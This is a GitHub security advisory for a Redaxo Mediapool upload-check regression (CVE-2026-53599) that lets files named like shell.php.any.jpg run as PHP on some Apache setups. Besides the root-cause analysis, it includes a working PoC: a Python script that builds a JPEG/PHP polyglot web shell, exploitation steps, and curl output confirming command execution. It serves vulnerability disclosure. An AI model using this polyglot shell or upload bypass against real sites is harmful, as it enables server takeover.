# [H] Redaxo has a Mediapool isAllowedExtension bypass via multi-segment filename that leads to authenticated RCE on Apache mod_php multi-extension handlers

## Summary
Severity: High
Advisory: GHSA-98pp-vccm-qm25
CVE: CVE-2026-53599
CWE: CWE-434
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-31
Source: https://github.com/advisories/GHSA-98pp-vccm-qm25
Type: github-advisory

## Affected
- Packagist: `redaxo/source` — affected >=5.18.2 <5.21.1

## Details
## Summary
 
`rex_mediapool::isAllowedExtension` in `redaxo/src/addons/mediapool/lib/mediapool.php` accepts filenames that contain a blocked extension as a non-terminal segment of a longer extension chain, for example `shell.php.any.jpg`. The check only catches the blocked extension when it appears at the end of the filename or immediately before the final extension. An authenticated backend user with mediapool upload permission can upload a JPEG/PHP polyglot named `shell.php.any.jpg` and, on web servers whose PHP handler matches `.php` as any segment (mod_mime `AddHandler`-style, or any `FilesMatch` regex without an end anchor), request the file from the public `media/` directory to execute arbitrary PHP as the web-server user.
 
The vulnerable check is a **regression** introduced in commit [`9d008697d`](https://github.com/redaxo/core/commit/9d008697dcec6bf5a972bdc081fadb68e9dab7fa) (PR #6213, Feb 7 2025), which weakened a previously correct `str_contains` check into a pair of `str_ends_with` checks. The earlier check, in place since 2018 specifically to defend against double-extension attacks, would have blocked this payload.
 
The regression has shipped in every release from 5.18.2 through 5.21.0.

## Details
## Root cause
 
At the audited commit `6e0de42`, `isAllowedExtension` performs three checks against the blocked-extension list:
 
```php
// redaxo/src/addons/mediapool/lib/mediapool.php (104–130) @ 6e0de42
public static function isAllowedExtension(string $filename, array $args = []): bool
{
    $fileExt = mb_strtolower(rex_file::extension($filename));
 
    if ('' === $filename || str_contains($fileExt, ' ') || '' === $fileExt) {
        return false;
    }
 
    if (str_starts_with($fileExt, 'php')) {
        return false;
    }
 
    $blockedExtensions = self::getBlockedExtensions();
    foreach ($blockedExtensions as $blockedExtension) {
        // $blockedExtensions extensions are not allowed within filenames, to prevent double extension vulnerabilities:
        // -> some webspaces execute files named file.php.txt as php
        if (str_ends_with($filename, '.' . $blockedExtension)
            || str_ends_with($filename, '.' . $blockedExtension . '.' . $fileExt)
        ) {
            return false;
        }
    }
 
    $allowedExtensions = self::getAllowedExtensions($args);
    return !count($allowedExtensions) || in_array($fileExt, $allowedExtensions);
}
```
 
For `shell.php.any.jpg`:
 
1. `$fileExt` is `jpg`, so `str_starts_with('jpg', 'php')` is false.
2. The loop checks two suffix shapes:
   - `str_ends_with('shell.php.any.jpg', '.php')` — false.
   - `str_ends_with('shell.php.any.jpg', '.php.jpg')` — false, because the actual chain is `.php.any.jpg`.
3. Default `$allowedExtensions` is empty (no widget `types` arg on the main mediapool upload page), so the function returns `true`.
The defensive comment on lines 119–120 explicitly names the threat model the maintainers are guarding against — *"some webspaces execute files named file.php.txt as php"*. The current check covers that exact two-segment shape but fails for any chain of length three or more in which a blocked extension is not the final segment.
 
### Regression history
 
Prior to commit [`9d008697d`](https://github.com/redaxo/core/commit/9d008697dcec6bf5a972bdc081fadb68e9dab7fa) (PR #6213, Feb 7 2025) the check was:
 
```php
if (str_contains($filename, '.' . $blockedExtension)) {
    return false;
}
```
 
`str_contains('shell.php.any.jpg', '.php')` is true, so the prior check would have correctly rejected this payload. The substring form had a false-positive problem with names like `foo.json` (which contains the substring `.js`), and the rewrite removed the false positive but also removed the multi-extension protection. The three regression tests added in that commit (`foo.js.txt`, `js_datei.txt`, `foo.json`) do not include a length-three-or-greater chain with a blocked non-terminal segment, so the security regression was not caught by the test suite.
 
The same weak check is invoked a second time from `rex_mediapool::filename()` during the normalization step, so the bypass also passes the renaming guard. `rex_string::normalize($mediaName, '_', '.-@')` preserves `.`, `-`, `@` and lowercases the rest, so `shell.php.any.jpg` survives normalization unchanged.

## PoC
Reproduced end-to-end on Apache 2.4.58 + PHP 8.3.6 on Ubuntu 24.04, using the exact validator code from commit `6e0de42` and a JPEG/PHP polyglot served from the same docroot under two different Apache PHP-handler configurations.
 
### Payload
 
Minimal JPEG/PHP polyglot, 188 bytes, MIME-classified as `image/jpeg`:
 
```python
# build_polyglot.py
jpeg_header = bytes([0xff,0xd8,0xff,0xe0,0x00,0x10]) + b'JFIF' + bytes([0x00,0x01,0x01,0x01,0x00,0x48,0x00,0x48,0x00,0x00])
php_payload = b'<?php echo "=== PWNED ===\n"; echo "file: " . __FILE__ . "\n"; echo "cmd output:\n"; $cmd = isset($_GET[chr(120)]) ? $_GET[chr(120)] : "id"; echo shell_exec($cmd); ?>'
jpeg_tail = bytes([0xff,0xd9])
open('shell.php.any.jpg','wb').write(jpeg_header + php_payload + jpeg_tail)
```

```
$ file --mime-type shell.php.any.jpg
shell.php.any.jpg: image/jpeg
```
 
### Validator output

Expected vulnerable deployment flow:

1. Log in as a backend user with media upload permission.
2. Upload the payload as `shell.php.any.jpg`.
3. REDAXO accepts the final `jpg` extension and `image/jpeg` MIME type, and stores `media/shell.php.any.jpg`.
4. Request `https://victim.example/media/shell.php.any.jpg?x=id`.
5. On Apache/mod_php-style multi-extension handler mappings, PHP code in the uploaded file executes. 

Running the exact `isAllowedExtension` logic from commit `6e0de42` against the default `blocked_extensions` list from `redaxo/src/addons/mediapool/package.yml`:
 
```
isAllowedExtension("shell.php.any.jpg") = TRUE — UPLOAD ACCEPTED
```
 
### HTTP execution test
 
The same file was placed in two Apache vhosts.
 
**Vhost A — current Ubuntu/Debian default `libapache2-mod-php8.3` config** (`<FilesMatch ".+\.ph(?:ar|p|tml)$">`, `$` anchor):
 
```
$ curl -sS -D - -o body "http://127.0.0.1:8081/shell.php.any.jpg?x=id"
HTTP/1.1 200 OK
Content-Type: image/jpeg
$ file body
body: JPEG image data, JFIF standard 1.01
```
 
File served as a static JPEG. **Not exploitable** on this configuration.
 
**Vhost B — non-anchored handler match** (`<FilesMatch "\.ph(?:ar|p|tml)(\.|$)">`, equivalent to `AddHandler application/x-httpd-php .php` behavior under mod_mime):
 
```
$ curl -sS "http://127.0.0.1:8082/shell.php.any.jpg?x=id"
=== PWNED ===
file: /home/riodrwn/sandbox/docroot/shell.php.any.jpg
cmd output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
 
PHP executes as `www-data`. **RCE confirmed.**

### Impact
A backend user holding only the `media[upload]` permission — the permission that the standard editor role carries — gains arbitrary PHP code execution as the web-server user on every REDAXO deployment whose Apache configuration maps PHP via a multi-extension handler.

## References
- https://github.com/redaxo/core/security/advisories/GHSA-98pp-vccm-qm25
- https://github.com/redaxo/core/pull/6538
- https://github.com/redaxo/core/commit/462e36896bb65d292ba22d711044c23c9cfb0340
- https://github.com/redaxo/core
- https://github.com/redaxo/core/releases/tag/5.21.1
